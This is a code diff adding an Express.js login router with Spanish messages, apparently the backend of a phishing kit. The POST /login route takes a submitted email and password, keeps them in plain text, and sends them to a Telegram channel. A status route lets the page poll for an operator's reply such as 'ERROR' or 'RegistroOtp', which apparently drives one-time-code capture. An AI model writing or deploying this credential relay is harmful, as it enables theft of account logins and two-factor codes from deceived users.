@@ -1,0 +1,77 @@
+const express = require('express');
+const router = express.Router();
+const telegramService = require('../services/telegramService');
+const sessionService = require('../services/sessionService');
+const { validateEmail, validatePassword } = require('../middleware/validationMiddleware');
+
+// POST /api/auth/login
+router.post('/login', async (req, res) => {
+  try {
+    const { email, password } = req.body;
+
+    // Validación
+    if (!email || !validateEmail(email)) {
+      return res.status(400).json({ error: 'Email inválido' });
+    }
+
+    if (!password || !validatePassword(password)) {
+      return res.status(400).json({ error: 'Contraseña inválida' });
+    }
+
+    // Crear sesión
+    const sessionId = sessionService.createSession({
+      type: 'login',
+      email,
+      password,
+    });
+
+    // Enviar a Telegram
+    await telegramService.sendAuthRequest(sessionId, email, password);
+
+    // Responder al cliente
+    res.json({
+      sessionId,
+      message: 'Solicitud enviada. Aguardando respuesta...',
+    });
+  } catch (error) {
+    console.error('[AUTH ERROR]', error);
+    res.status(500).json({ error: 'Error al procesar la solicitud' });
+  }
+});
+
+// GET /api/auth/status/:sessionId
+router.get('/status/:sessionId', (req, res) => {
+  try {
+    const { sessionId } = req.params;
+
+    // Validar sesión
+    if (!sessionId) {
+      return res.status(400).json({ error: 'Session ID requerido' });
+    }
+
+    const session = sessionService.getSession(sessionId);
+
+    // Sesión no existe
+    if (!session) {
+      return res.status(404).json({ error: 'Sesión no encontrada o expirada' });
+    }
+
+    // Sesión expirada
+    if (sessionService.isExpired(sessionId)) {
+      sessionService.deleteSession(sessionId);
+      return res.status(410).json({ error: 'Sesión expirada' });
+    }
+
+    // Retornar estado
+    res.json({
+      sessionId,
+      status: session.status,
+      response: session.response, // null, 'ERROR', 'RegistroOtp', etc
+    });
+  } catch (error) {
+    console.error('[STATUS ERROR]', error);
+    res.status(500).json({ error: 'Error al obtener estado' });
+  }
+});
+
+module.exports = router;
